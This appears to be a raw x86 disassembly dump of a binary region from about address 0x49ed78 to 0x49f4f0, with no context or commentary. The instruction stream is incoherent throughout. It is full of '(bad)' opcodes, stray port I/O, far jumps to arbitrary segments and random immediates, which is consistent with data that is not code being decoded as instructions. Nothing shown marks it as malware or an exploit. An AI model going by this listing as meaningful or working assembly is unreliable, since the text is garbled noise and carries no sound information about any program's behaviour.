  49ed78:	pop    edx
  49ed79:	mov    al,0x76
  49ed7b:	mov    ch,dl
  49ed7d:	jle    0x49edf9
  49ed7f:	mov    ebp,0x957e47a6
  49ed84:	push   es
  49ed85:	lods   eax,DWORD PTR ds:[esi]
  49ed86:	jmp    0x4ccff48a
  49ed8b:	xchg   DWORD PTR [edi-0x647bb501],ebx
  49ed91:	call   FWORD PTR [ebp-0x64]
  49ed94:	mov    dh,0x46
  49ed96:	les    edx,FWORD PTR [esi-0x7a]
  49ed99:	retf   
  49ed9a:	sahf   
  49ed9b:	int    0xc1
  49ed9d:	shl    dl,cl
  49ed9f:	xchg   cl,dh
  49eda1:	shr    bh,1
  49eda3:	lock clts 
  49eda6:	das    
  49eda7:	push   0xcf84f3b7
  49edac:	out    dx,al
  49edad:	out    0x7e,al
  49edaf:	retf   
  49edb0:	in     al,dx
  49edb1:	xchg   dl,ah
  49edb3:	jle    0x49ee19
  49edb5:	stos   DWORD PTR es:[edi],eax
  49edb6:	(bad)
  49edb9:	add    DWORD PTR [edx-0xe],eax
  49edbc:	pop    edx
  49edbd:	pushf  
  49edbe:	mov    ch,0x1e
  49edc0:	or     al,0xb9
  49edc2:	cmp    ebx,DWORD PTR [ebp-0x23]
  49edc5:	shl    eax,0xfe
  49edc8:	out    dx,eax
  49edc9:	push   esi
  49edca:	xchg   DWORD PTR [esi],eax
  49edcc:	lahf   
  49edcd:	xchg   esi,eax
  49edce:	xchg   cl,al
  49edd0:	ret    
  49edd1:	push   cs
  49edd2:	div    DWORD PTR [esi-0x9]
  49edd5:	add    BYTE PTR [ebx+ecx*4-0x1a80f85d],bh
  49eddc:	(bad)  
  49eddd:	call   0x9b60d7f0
  49ede2:	jg     0x49ed6b
  49ede4:	mov    ah,BYTE PTR [edx]
  49ede6:	into   
  49ede7:	inc    edi
  49ede8:	push   es
  49ede9:	cmp    BYTE PTR [edi],bl
  49edeb:	jnp    0x49edb0
  49eded:	jecxz  0x49ede4
  49edef:	jns    0x49edb3
  49edf1:	loop   0x49edce
  49edf3:	and    si,0xffff
  49edf7:	test   ebp,edx
  49edf9:	add    DWORD PTR [esi-0x2c7881fa],0xe
  49ee00:	test   ebp,ecx
  49ee02:	lahf   
  49ee03:	outs   dx,BYTE PTR ds:[esi]
  49ee04:	mov    ch,BYTE PTR [esi+0x6e]
  49ee07:	bound  esp,QWORD PTR [edx+0x4a82f6bc]
  49ee0d:	test   DWORD PTR [ebx-0x4be4b1f9],ebx
  49ee13:	rol    DWORD PTR [edi],0x8e
  49ee16:	outs   dx,DWORD PTR ds:[esi]
  49ee17:	mov    cl,0xcc
  49ee19:	jle    0x49edd9
  49ee1b:	test   BYTE PTR [edi-0x493a0f30],al
  49ee21:	pop    esp
  49ee22:	fs pop es
  49ee24:	add    DWORD PTR es:[esi],0xffffff85
  49ee28:	iret   
  49ee29:	push   ss
  49ee2a:	es adc al,0xff
  49ee2d:	dec    edi
  49ee2e:	add    BYTE PTR [ebx+0x77f6fbd7],0xc4
  49ee35:	in     eax,0xb2
  49ee37:	je     0x49edf7
  49ee39:	mov    ds:0xa5687d2a,eax
  49ee3e:	rol    al,0xc3
  49ee41:	add    eax,0xd1beb786
  49ee46:	push   es
  49ee47:	ins    BYTE PTR es:[edi],dx
  49ee48:	(bad)  
  49ee4a:	pop    es
  49ee4b:	addr16 out dx,eax
  49ee4d:	pop    ds
  49ee4e:	sbb    BYTE PTR [ecx+0x7700e91d],al
  49ee54:	push   cs
  49ee55:	loope  0x49ee56
  49ee57:	sbb    eax,0xa7067068
  49ee5c:	les    ebp,FWORD PTR [esi+0x66]
  49ee5f:	addr16 addr16 call 0x787c:0x1555551
  49ee68:	push   cs
  49ee69:	pop    esi
  49ee6a:	loopne 0x49ee34
  49ee6c:	out    0xf5,al
  49ee6e:	out    dx,al
  49ee6f:	test   dh,dl
  49ee71:	jle    0x49ee46
  49ee73:	aam    0xba
  49ee75:	lods   eax,DWORD PTR ds:[esi]
  49ee76:	fsubr  DWORD PTR [esi+edx*1-0x7c]
  49ee7a:	ror    DWORD PTR [edx-0x2a746127],cl
  49ee80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49ee81:	imul   esp,DWORD PTR [esp+edi*4+0x7a6d57e0],0x8606930e
  49ee8c:	sahf   
  49ee8d:	test   BYTE PTR [ebx-0x5092005c],0xcb
  49ee94:	mov    al,0xa5
  49ee96:	mov    al,0x81
  49ee98:	inc    esi
  49ee99:	push   esi
  49ee9a:	inc    esi
  49ee9b:	pop    es
  49ee9c:	pop    es
  49ee9d:	das    
  49ee9e:	jp     0x49ee70
  49eea0:	je     0x49ee31
  49eea2:	outs   dx,BYTE PTR ds:[esi]
  49eea3:	xacquire xchg DWORD PTR [edx+0x1e],edi
  49eea7:	test   DWORD PTR [edi-0x4cbc0929],0x848bda9a
  49eeb1:	xchg   esi,eax
  49eeb2:	xor    ebp,DWORD PTR [esi+0x1ae19ff3]
  49eeb8:	sbb    ecx,0xe001006c
  49eebe:	ins    DWORD PTR es:[edi],dx
  49eebf:	jmp    0xd7ec:0x7d5c365f
  49eec6:	addr16 idiv DWORD PTR [si]
  49eeca:	sbb    BYTE PTR [eax-0x79f849ef],bh
  49eed0:	xchg   edi,eax
  49eed1:	hlt    
  49eed2:	push   esi
  49eed3:	cld    
  49eed4:	push   ebp
  49eed5:	pop    edi
  49eed6:	inc    esi
  49eed7:	jmp    0xfa8b:0x8b8ee8e8
  49eede:	push   esi
  49eedf:	pop    ecx
  49eee0:	pop    ecx
  49eee1:	push   ecx
  49eee2:	(bad)  
  49eee3:	call   0xe72906dd
  49eee8:	or     eax,DWORD PTR [esi-0x2778001b]
  49eeee:	stc    
  49eeef:	aad    0xf6
  49eef1:	pop    es
  49eef2:	adc    DWORD PTR [esi],0xffffff84
  49eef5:	jecxz  0x49eee1
  49eef7:	or     BYTE PTR ds:0xac97ff7e,0xff
  49eefe:	mov    ebx,eax
  49ef00:	(bad)
  49ef04:	rol    DWORD PTR [esi-0x5a71ac82],0xa6
  49ef0b:	mov    bl,0xce
  49ef0d:	(bad)  
  49ef0e:	aam    0xd
  49ef10:	ds pop ebx
  49ef12:	cs pop esi
  49ef14:	test   ebp,edx
  49ef16:	repz push es
  49ef18:	push   cs
  49ef19:	shl    ebx,cl
  49ef1b:	sahf   
  49ef1c:	sub    esi,esi
  49ef1e:	jg     0x49eed9
  49ef20:	es xchg ebp,edx
  49ef23:	hlt    
  49ef24:	jb     0x49eee0
  49ef26:	(bad)  
  49ef27:	loop   0x49efa4
  49ef29:	(bad)  
  49ef2a:	in     al,0x18
  49ef2c:	add    BYTE PTR [ecx],al
  49ef2e:	xor    BYTE PTR [eax+0xe],dl
  49ef31:	call   0x85e:0xd8861ddb
  49ef38:	rol    ecx,0x76
  49ef3b:	outs   dx,DWORD PTR ds:[esi]
  49ef3c:	pop    es
  49ef3d:	pop    DWORD PTR [edi-0x5215c0b4]
  49ef43:	pop    es
  49ef44:	pop    es
  49ef45:	out    dx,al
  49ef46:	(bad)  
  49ef48:	fld    QWORD PTR [esi]
  49ef4a:	dec    ebp
  49ef4b:	sar    DWORD PTR [edi-0x3f],0x0
  49ef4f:	out    0xf3,al
  49ef51:	imul   ebp,DWORD PTR [esp+ebp*2-0x5c],0x7e
  49ef56:	jmp    0xe7b6:0x6a6dd3c9
  49ef5d:	neg    dl
  49ef5f:	sti    
  49ef60:	(bad)  
  49ef61:	jle    0x49eee9
  49ef63:	xlat   BYTE PTR ds:[ebx]
  49ef64:	pop    es
  49ef65:	stc    
  49ef66:	fdivr  st(4),st
  49ef68:	outs   dx,DWORD PTR ds:[esi]
  49ef69:	push   edi
  49ef6a:	ficomp DWORD PTR [esi]
  49ef6c:	xchg   ebx,eax
  49ef6d:	fisub  WORD PTR [esi]
  49ef6f:	mov    esi,0x8048ffd0
  49ef74:	push   cs
  49ef75:	dec    ebp
  49ef76:	mov    DWORD PTR [eax+0x164e606b],esp
  49ef7c:	jle    0x49ef0d
  49ef7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49ef7f:	repnz push edi
  49ef81:	aam    0x7
  49ef83:	jb     0x49effc
  49ef85:	sar    DWORD PTR [ebp+esi*8-0x7a2a7901],1
  49ef8c:	push   ds
  49ef8d:	xchg   DWORD PTR [esi],ecx
  49ef8f:	pop    es
  49ef90:	int    0x15
  49ef92:	fucomi st,st(6)
  49ef94:	es (bad) 
  49ef97:	ins    DWORD PTR es:[edi],dx
  49ef98:	dec    esi
  49ef99:	add    BYTE PTR es:[ecx],al
  49ef9c:	rol    DWORD PTR [edx],cl
  49ef9e:	jb     0x49f00c
  49efa0:	xor    BYTE PTR [ebx-0x1b852b],bl
  49efa6:	fisttp DWORD PTR ss:[bx]
  49efaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49efab:	ficom  WORD PTR [edi-0x24]
  49efae:	add    bh,bh
  49efb0:	shl    edx,cl
  49efb2:	retf   
  49efb3:	data16 mov bl,0xd9
  49efb6:	ins    BYTE PTR es:[edi],dx
  49efb7:	enter  0xa9c2,0xb5
  49efbb:	xchg   ebx,eax
  49efbc:	lods   eax,DWORD PTR ds:[esi]
  49efbd:	and    DWORD PTR [ecx-0x32640a2c],0x71
  49efc4:	xchg   DWORD PTR [edi+0x7e],ebx
  49efc7:	aas    
  49efc8:	jne    0x49f03d
  49efca:	jae    0x49efed
  49efcc:	jle    0x49f02c
  49efce:	cmc    
  49efcf:	jne    0x49efbe
  49efd1:	(bad)
  49efd6:	std    
  49efd7:	push   es
  49efd8:	cli    
  49efd9:	push   cs
  49efda:	fld    DWORD PTR [edi]
  49efdc:	sti    
  49efdd:	clc    
  49efde:	out    0xc1,eax
  49efe0:	sti    
  49efe1:	pop    ds
  49efe2:	xchg   esp,eax
  49efe3:	loope  0x49f00b
  49efe5:	sar    BYTE PTR [esi-0x7f],0x96
  49efe9:	mov    ds:0xa88f54ff,al
  49efee:	sub    eax,0xb660aa0e
  49eff3:	xchg   DWORD PTR cs:[esi-0x7a],ebp
  49eff7:	dec    esi
  49eff8:	jg     0x49eff5
  49effa:	pop    ebp
  49effb:	mov    al,0x7
  49effd:	jg     0x49eff2
  49efff:	pop    ss
  49f000:	mov    dh,dl
  49f002:	push   es
  49f003:	js     0x49efc4
  49f005:	fucom  st(0)
  49f007:	jb     0x49efc1
  49f009:	(bad)  
  49f00a:	fldcw  WORD PTR [esi+ebp*1-0x26]
  49f00e:	sub    BYTE PTR [eax],al
  49f010:	add    edx,edx
  49f012:	xor    esp,edx
  49f014:	loopne 0x49efea
  49f016:	fwait
  49f017:	int    0x66
  49f019:	mov    bl,0xf7
  49f01b:	shl    bl,1
  49f01d:	int    0xc3
  49f01f:	leave  
  49f020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49f021:	(bad)  
  49f022:	jl     0x49efe7
  49f024:	mov    bl,0xd9
  49f026:	ins    BYTE PTR es:[edi],dx
  49f027:	ss pop edx
  49f029:	mov    ch,0x35
  49f02b:	mov    ebp,0xa40cb516
  49f030:	add    DWORD PTR [ecx-0x61f999ae],esp
  49f036:	test   DWORD PTR [edx],0x66b00f83
  49f03c:	cmc    
  49f03d:	jg     0x49f02d
  49f03f:	mov    edi,ebx
  49f041:	jmp    DWORD PTR [edi+0x7e]
  49f044:	loope  0x49eff9
  49f046:	cmp    eax,0xdafcdbcd
  49f04b:	fstp   QWORD PTR [esi]
  49f04d:	xchg   ebp,eax
  49f04e:	loope  0x49f010
  49f050:	sar    cl,cl
  49f052:	or     edi,DWORD PTR [esi+0x7698feea]
  49f058:	mov    ah,BYTE PTR [ebx+0x7e9156ff]
  49f05e:	jae    0x49f017
  49f060:	sar    bh,cl
  49f062:	mov    esi,edx
  49f064:	not    BYTE PTR [esi]
  49f066:	pop    ss
  49f067:	pop    es
  49f068:	mov    dl,0xd6
  49f06a:	test   DWORD PTR [edi-0x558177f2],0x7f0ff9d8
  49f074:	shl    eax,0xe0
  49f077:	jae    0x49f033
  49f079:	fadd   DWORD PTR [ecx]
  49f07b:	xor    dl,bh
  49f07d:	cmp    al,0x40
  49f07f:	div    ch
  49f081:	or     DWORD PTR [edx+0x305cd6e0],0x8e6640b2
  49f08b:	fdiv   st(6),st
  49f08d:	fistp  QWORD PTR [esi-0x69]
  49f090:	in     al,0xfc
  49f092:	xchg   ebp,eax
  49f093:	jns    0x49f093
  49f095:	mov    edi,0xff998249
  49f09a:	push   eax
  49f09b:	mov    WORD PTR [edi+edi*8-0x2c546ca9],fs
  49f0a2:	ss dec ebx
  49f0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49f0a5:	mov    bl,0xb
  49f0a7:	push   esi
  49f0a8:	test   DWORD PTR [esi],0x82f7d60f
  49f0ae:	mov    edi,0xee888f6a
  49f0b3:	push   es
  49f0b4:	clc    
  49f0b5:	jle    0x49f098
  49f0b7:	loopne 0x49f12e
  49f0b9:	mov    esp,0xd9e07fdb
  49f0be:	xchg   ebp,eax
  49f0bf:	cmp    BYTE PTR [esi-0xb],0x83
  49f0c3:	mov    WORD PTR [ebx+0x5ef660c1],?
  49f0c9:	mov    ebx,esp
  49f0cb:	pop    es
  49f0cc:	mov    cl,BYTE PTR [esi-0x31a6661]
  49f0d2:	push   cs
  49f0d3:	rol    DWORD PTR [ebp+0x3b],0x61
  49f0d7:	ret    0xffd2
  49f0da:	push   ecx
  49f0db:	mov    esi,?
  49f0dd:	push   esi
  49f0de:	xchg   edx,eax
  49f0df:	lods   eax,DWORD PTR ds:[esi]
  49f0e0:	jg     0x49f11a
  49f0e2:	or     eax,0xc68ae71d
  49f0e7:	stc    
  49f0e8:	(bad)  
  49f0ea:	or     eax,0x8e3060dc
  49f0ef:	data16 xchg BYTE PTR [edi],dl
  49f0f2:	jg     0x49f0ed
  49f0f4:	rol    BYTE PTR [esp],0xff
  49f0f8:	(bad)  
  49f0f9:	jnp    0x49f0c0
  49f0fb:	in     al,0xe0
  49f0fd:	jbe    0x49f0bf
  49f0ff:	fst    st(3)
  49f101:	mov    dh,0x10
  49f103:	dec    ebp
  49f104:	sub    BYTE PTR [eax],ah
  49f106:	test   dh,bl
  49f108:	lea    ebx,[esp+ecx*4]
  49f10b:	fiadd  WORD PTR [esi]
  49f10d:	int    0x57
  49f10f:	lock into 
  49f111:	mov    ebx,ebp
  49f113:	push   cs
  49f114:	mov    WORD PTR [edi+0x4c],?
  49f117:	test   BYTE PTR [ebx-0x1fcacc73],bl
  49f11d:	repz test al,0xff
  49f120:	pop    eax
  49f121:	xchg   ebx,eax
  49f122:	mov    ecx,0x4ff8b6d4
  49f127:	fsub   st,st(7)
  49f129:	mov    ch,0x83
  49f12b:	add    eax,0x89067787
  49f130:	push   ds
  49f131:	mov    DWORD PTR [eax],eax
  49f133:	or     bh,BYTE PTR [esi+0x78df2602]
  49f139:	ret    0x27e0
  49f13c:	jg     0x49f196
  49f13e:	in     al,0x2a
  49f140:	inc    edx
  49f141:	outs   dx,BYTE PTR ds:[esi]
  49f142:	cmc    
  49f143:	out    dx,al
  49f144:	jbe    0x49f0d3
  49f146:	jecxz  0x49f13a
  49f148:	push   eax
  49f149:	imul   esp,DWORD PTR [edi],0xee18c67
  49f14f:	mov    esp,edx
  49f151:	(bad)  
  49f152:	out    0x3,eax
  49f154:	call   FWORD PTR [ebx-0x70612b59]
  49f15a:	test   eax,0xae965aff
  49f15f:	push   DWORD PTR [ebp-0x46]
  49f162:	(bad)  
  49f163:	push   cs
  49f164:	inc    edx
  49f165:	cmc    
  49f166:	leave  
  49f167:	aaa    
  49f168:	inc    edi
  49f169:	(bad)  
  49f16b:	jle    0x49f146
  49f16d:	sub    al,bh
  49f16f:	fistp  QWORD PTR [ecx-0x26]
  49f172:	ss jle 0x49f13f
  49f175:	jmp    0xe40e6d59
  49f17a:	jg     0x49f134
  49f17c:	int    0xff
  49f17e:	add    eax,DWORD PTR [edi-0x780a062a]
  49f184:	fdiv   st,st(6)
  49f186:	dec    DWORD PTR [edi+0x6e28ee5]
  49f18c:	aas    
  49f18d:	repnz sbb al,0x34
  49f190:	(bad)  
  49f191:	loop   0x49f211
  49f193:	in     al,0xe9
  49f195:	dec    esp
  49f196:	test   BYTE PTR [edi-0xc31ac01],bl
  49f19c:	aas    
  49f19d:	lahf   
  49f19e:	xchg   ecx,eax
  49f19f:	xchg   edi,eax
  49f1a0:	mov    al,0xd7
  49f1a2:	dec    DWORD PTR [ebx-0x76000526]
  49f1a8:	mov    DWORD PTR [ecx-0x10],ebx
  49f1ab:	cmp    ebx,eax
  49f1ad:	pop    es
  49f1ae:	(bad)  
  49f1af:	daa    
  49f1b0:	(bad)  
  49f1b2:	jle    0x49f17f
  49f1b4:	jmp    0x49f19c
  49f1b6:	pop    ds
  49f1b7:	inc    eax
  49f1b8:	mov    dl,0xc6
  49f1ba:	in     eax,0x88
  49f1bc:	fdivr  st,st(3)
  49f1be:	cmc    
  49f1bf:	mov    edx,ebx
  49f1c1:	jl     0x49f1d0
  49f1c3:	dec    esi
  49f1c4:	rcl    DWORD PTR [ecx-0x706f9919],0x8f
  49f1cb:	push   cs
  49f1cc:	mov    fs,esi
  49f1ce:	repz (bad) 
  49f1d0:	stc    
  49f1d1:	adc    al,0x7e
  49f1d3:	call   0x54ff:0xa186c38b
  49f1da:	xchg   edx,eax
  49f1db:	lods   al,BYTE PTR ds:[esi]
  49f1dc:	call   FWORD PTR [ebx-0x68]
  49f1df:	mov    cl,0x96
  49f1e1:	pusha  
  49f1e2:	or     BYTE PTR [ecx-0x45],0x4e
  49f1e6:	pop    edi
  49f1e7:	pop    es
  49f1e8:	jg     0x49f1cb
  49f1ea:	into   
  49f1eb:	sar    DWORD PTR [esi-0x76],0x6
  49f1ef:	jle    0x49f1cf
  49f1f1:	jge    0x49f1ba
  49f1f3:	icebp  
  49f1f4:	add    BYTE PTR ss:[edx-0x3118019],0xf5
  49f1fc:	mov    bl,bl
  49f1fe:	dec    ebp
  49f1ff:	lock sub DWORD PTR [eax-0xa],ebx
  49f203:	xchg   edx,eax
  49f204:	call   0xe6da837f
  49f209:	(bad)  
  49f20a:	nop
  49f20b:	add    edx,DWORD PTR [eax+edi*2]
  49f20e:	lock push ds
  49f210:	fwait
  49f211:	jmp    0x9076:0xf6d5c47e
  49f218:	inc    eax
  49f219:	mov    esi,0xb07f9441
  49f21e:	push   DWORD PTR [edx+edi*4-0x2a]
  49f222:	cld    
  49f223:	lahf   
  49f224:	jno    0x49f28d
  49f226:	ja     0x49f24e
  49f228:	push   es
  49f229:	mov    dh,0xde
  49f22b:	jg     0x49f1f7
  49f22d:	call   0x61f8f940
  49f232:	out    0xff,al
  49f234:	push   ecx
  49f235:	adc    DWORD PTR [edi-0x74],edi
  49f238:	fdiv   st(6),st
  49f23a:	cmc    
  49f23b:	(bad)  
  49f23c:	(bad)  
  49f23e:	call   DWORD PTR [edx+ebp*8-0x7ca4dc7e]
  49f245:	xchg   ebx,eax
  49f246:	xchg   ecx,ebp
  49f248:	push   cs
  49f249:	xchg   edx,eax
  49f24a:	out    0x9c,eax
  49f24c:	jmp    0x49f2cc
  49f24e:	mov    sp,0xf9f9
  49f252:	mov    ebp,es
  49f254:	(bad)  
  49f255:	dec    DWORD PTR [esi+0x54]
  49f258:	(bad)  
  49f259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49f25a:	xchg   edi,eax
  49f25b:	scas   eax,DWORD PTR es:[edi]
  49f25c:	(bad)  
  49f25d:	jge    0x49f1e5
  49f25f:	cmp    DWORD PTR [eax-0x5d],edi
  49f262:	loopne 0x49f1f2
  49f264:	(bad)  
  49f266:	ja     0x49f26f
  49f268:	jle    0x49f1f3
  49f26a:	adc    BYTE PTR [eax-0x1030a07a],al
  49f270:	fiadd  WORD PTR [eax-0x33001335]
  49f276:	sahf   
  49f277:	out    0x53,al
  49f279:	jle    0x49f259
  49f27b:	loopne 0x49f279
  49f27d:	in     al,dx
  49f27e:	jmp    0xf3b5838a
  49f283:	in     al,dx
  49f284:	clc    
  49f285:	nop
  49f286:	jmp    0x49f306
  49f288:	fwait
  49f289:	in     al,dx
  49f28a:	ret    0x824a
  49f28d:	pop    esp
  49f28e:	push   ebp
  49f28f:	pop    ebp
  49f290:	mov    al,0xfe
  49f292:	pop    ecx
  49f293:	xchg   esi,eax
  49f294:	jbe    0x49f309
  49f296:	mov    ch,0xd2
  49f298:	into   
  49f299:	xlat   BYTE PTR ds:[ebx]
  49f29a:	(bad)  
  49f29b:	ffree  st(4)
  49f29d:	pop    ss
  49f29e:	add    al,0xe
  49f2a0:	inc    esi
  49f2a1:	jg     0x49f22d
  49f2a3:	fdiv   st(4),st
  49f2a5:	inc    ebp
  49f2a6:	add    al,0x6e
  49f2a8:	lods   al,BYTE PTR ds:[esi]
  49f2a9:	sahf   
  49f2aa:	repnz fild QWORD PTR [esi]
  49f2ad:	jg     0x49f249
  49f2af:	int    0x9
  49f2b1:	xchg   edx,eax
  49f2b2:	(bad)  
  49f2b3:	fisttp WORD PTR [edi+0x7c1795e2]
  49f2b9:	cs jns 0x49f250
  49f2bc:	(bad)  
  49f2bd:	cdq    
  49f2be:	jmp    0x49f2e6
  49f2c0:	mov    es,edi
  49f2c2:	fcom   DWORD PTR [eax-0xad78a]
  49f2c8:	pusha  
  49f2c9:	mov    al,ds:0x90b0deba
  49f2ce:	fidiv  DWORD PTR [edx-0x6b1f0e2b]
  49f2d4:	test   BYTE PTR [edx-0x6dfff889],0x7f
  49f2db:	loopne 0x49f30c
  49f2dd:	jle    0x49f2b2
  49f2df:	repz fiadd WORD PTR [edx+0x6cf3f0d1]
  49f2e6:	call   0x90f5:0xffe08eff
  49f2ed:	jecxz  0x49f2ec
  49f2ef:	out    dx,al
  49f2f0:	xchg   ebp,eax
  49f2f1:	in     al,dx
  49f2f2:	jmp    0x8d8f:0x4f9eabe6
  49f2f9:	jmp    0xffee:0xdb9e1eec
  49f300:	test   DWORD PTR [edx+0xa],ecx
  49f303:	call   0x6edc:0xfedfae05
  49f30a:	mov    esi,edx
  49f30c:	add    eax,0xfb07c513
  49f311:	jle    0x49f2e8
  49f313:	repz fld QWORD PTR [ebx+0x4e6fcdd3]
  49f31a:	inc    eax
  49f31b:	nop
  49f31c:	jecxz  0x49f2b0
  49f31e:	in     eax,0xfe
  49f320:	call   DWORD PTR [esi-0x26466b0f]
  49f326:	ins    BYTE PTR es:[edi],dx
  49f327:	sahf   
  49f328:	out    dx,eax
  49f329:	in     al,dx
  49f32a:	xchg   ebp,eax
  49f32b:	in     eax,dx
  49f32c:	mov    eax,ds:0xfaedabf1
  49f331:	jno    0x49f331
  49f333:	dec    ebx
  49f334:	mov    cl,0xe0
  49f336:	test   BYTE PTR [esi],0xb6
  49f339:	xchg   edx,eax
  49f33a:	fdivp  st(5),st
  49f33c:	dec    DWORD PTR [ebx+eiz*4+0x6ff68b11]
  49f343:	pop    es
  49f344:	es in  al,0xcd
  49f347:	add    DWORD PTR [esp+edx*1],edx
  49f34a:	sub    DWORD PTR cs:[edi-0x1c],edi
  49f34e:	xchg   ecx,eax
  49f34f:	fldcw  WORD PTR [edi+eax*2-0x65]
  49f353:	out    0x9a,al
  49f355:	cmc    
  49f356:	fdivrp st(1),st
  49f358:	push   cs
  49f359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49f35a:	rep lods eax,DWORD PTR ds:[esi]
  49f35c:	repnz mov al,ah
  49f35f:	inc    eax
  49f360:	mov    ebx,0x26fae8a9
  49f365:	fisubr WORD PTR [esi]
  49f367:	push   ds
  49f368:	dec    edx
  49f369:	adc    eax,0x26ee302c
  49f36e:	(bad)  
  49f36f:	(bad)  [edi+0x7c]
  49f372:	test   DWORD PTR [eax+edi*8-0x1c798901],ecx
  49f379:	adc    eax,0xcc3828f0
  49f37f:	add    DWORD PTR [edi+edi*2-0x1b],esi
  49f383:	dec    esi
  49f384:	sbb    BYTE PTR [eax+ebp*2],bh
  49f387:	push   ss
  49f388:	outs   dx,BYTE PTR ds:[esi]
  49f389:	test   al,0xf8
  49f38b:	scas   eax,DWORD PTR es:[edi]
  49f38c:	xchg   BYTE PTR [ebp+ebp*8-0x7cf9c291],ch
  49f393:	cs sahf 
  49f395:	(bad)  
  49f396:	jbe    0x49f3b6
  49f398:	mov    fs,WORD PTR [bx+si]
  49f39b:	cmp    esp,DWORD PTR [ecx-0x7f]
  49f39e:	fstp   TBYTE PTR [esi-0x3c15f022]
  49f3a4:	sahf   
  49f3a5:	mov    cl,0x5f
  49f3a7:	iret   
  49f3a8:	psubusb mm7,mm2
  49f3ab:	test   DWORD PTR [ebx-0x41ff00fb],0xd887e5ae
  49f3b5:	clc    
  49f3b6:	enter  0x7616,0xbd
  49f3ba:	fisttp DWORD PTR [ebx]
  49f3bc:	jg     0x49f3c8
  49f3be:	or     al,0x3f
  49f3c0:	add    BYTE PTR [ebx-0x53060010],ah
  49f3c6:	fisubr WORD PTR [esi-0x11]
  49f3c9:	mov    eax,ds:0x9d6fe619
  49f3ce:	fcomi  st,st(1)
  49f3d0:	dec    DWORD PTR [edx-0x6cf10e30]
  49f3d6:	rol    DWORD PTR [eax+0x6],0x74
  49f3da:	push   ss
  49f3db:	xchg   ebp,eax
  49f3dc:	scas   al,BYTE PTR es:[edi]
  49f3dd:	xchg   BYTE PTR [esi],ch
  49f3df:	mov    dh,BYTE PTR [ecx+0x54]
  49f3e2:	jne    0x49f3e0
  49f3e4:	xrelease xchg DWORD PTR [esi],ebp
  49f3e7:	loop   0x49f39f
  49f3e9:	fidiv  WORD PTR [esi]
  49f3eb:	shl    edi,1
  49f3ed:	ins    DWORD PTR es:[edi],dx
  49f3ee:	fdiv   st,st(0)
  49f3f0:	push   es
  49f3f1:	mov    ecx,0xde95fece
  49f3f6:	(bad)  
  49f3f7:	addr16 push cs
  49f3f9:	cmp    al,0xe1
  49f3fb:	lahf   
  49f3fc:	add    DWORD PTR [ebx+0x7e10861c],0xf
  49f403:	push   cs
  49f404:	js     0x49f3c7
  49f406:	fild   WORD PTR [esi]
  49f408:	pop    ss
  49f409:	mov    ebp,0x9c014a80
  49f40e:	fsubp  st(0),st
  49f410:	lahf   
  49f411:	loopne 0x49f405
  49f413:	pop    ss
  49f414:	loopne 0x49f41d
  49f416:	add    eax,0xda6ed94e
  49f41b:	idiv   edi
  49f41d:	xchg   edi,eax
  49f41e:	push   ss
  49f41f:	call   0xb5a2dcc3
  49f424:	jecxz  0x49f425
  49f426:	cld    
  49f427:	shl    DWORD PTR [ecx-0x604c0217],1
  49f42d:	jmp    0x8d68:0xb6988efd
  49f434:	mov    esi,0xd0708c31
  49f439:	lea    ebp,[edi-0x1f72e7b2]
  49f43f:	dec    BYTE PTR [esi+edi*1]
  49f442:	add    eax,0x162a047e
  49f447:	fidiv  WORD PTR [ebx+0x6e]
  49f44a:	add    eax,DWORD PTR [edx]
  49f44c:	push   cs
  49f44d:	add    edi,esp
  49f44f:	aas    
  49f450:	push   edi
  49f451:	sbb    ebp,DWORD PTR [ecx]
  49f453:	dec    esi
  49f454:	clc    
  49f455:	jl     0x49f466
  49f457:	inc    eax
  49f459:	jo     0x49f410
  49f45b:	jno    0x49f4a3
  49f45d:	sub    bh,dh
  49f45f:	lock aas 
  49f461:	pushf  
  49f462:	pushf  
  49f463:	mov    ah,0x37
  49f465:	aas    
  49f466:	adc    eax,0x3071f0e
  49f46b:	mov    ecx,0xfcd2a690
  49f470:	add    eax,edi
  49f472:	(bad)  
  49f473:	sbb    al,0x39
  49f475:	cmp    ebp,DWORD PTR [ebp+0x4f]
  49f478:	lock or BYTE PTR [edi],0xe0
  49f47c:	rol    al,0x30
  49f47f:	test   DWORD PTR [esi+edi*4-0x75],edx
  49f483:	sub    al,0xf
  49f485:	add    BYTE PTR [edi],cl
  49f487:	enter  0x90e5,0xcb
  49f48b:	pop    es
  49f48c:	pusha  
  49f48d:	add    esi,DWORD PTR [eax+0x3]
  49f490:	jb     0x49f4b3
  49f492:	pop    edi
  49f493:	js     0x49f495
  49f495:	add    DWORD PTR [eax],eax
  49f497:	add    DWORD PTR [edi+0x23],esp
  49f49a:	mov    ebx,0xbffefc90
  49f49f:	or     BYTE PTR [ebp+0xf6a0193],0x3
  49f4a6:	jg     0x49f4d9
  49f4a8:	add    eax,0x4f6faa91
  49f4ad:	adc    BYTE PTR [eax+0xf05010c],cl
  49f4b3:	sbb    BYTE PTR [edx],bh
  49f4b5:	test   DWORD PTR [ebx-0x41e428c0],ebp
  49f4bb:	sub    eax,0x6922b62f
  49f4c0:	sbb    al,0x21
  49f4c2:	or     DWORD PTR [esi],eax
  49f4c4:	sub    eax,0x3ffff34
  49f4c9:	add    ch,BYTE PTR [ebx]
  49f4cb:	and    DWORD PTR [eax],edx
  49f4cd:	or     DWORD PTR [eax+0x6a],ebx
  49f4d0:	push   ecx
  49f4d1:	inc    esi
  49f4d2:	pushf  
  49f4d3:	imul   edx,DWORD PTR [edi+0x4c],0xffffffcd
  49f4d7:	push   cs
  49f4d8:	mov    esp,esi
  49f4da:	mov    bh,0xdf
  49f4dc:	int3   
  49f4dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49f4de:	adc    BYTE PTR [ebx],ch
  49f4e0:	push   cs
  49f4e1:	adc    BYTE PTR [eax],dl
  49f4e3:	pusha  
  49f4e4:	dec    ebx
  49f4e5:	add    BYTE PTR [ecx-0x1e7c7c7e],ah
  49f4eb:	outs   dx,BYTE PTR ds:[esi]
  49f4ec:	and    BYTE PTR gs:[edx],bl
  49f4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49f4f0:	jmp    0xffc18a8f
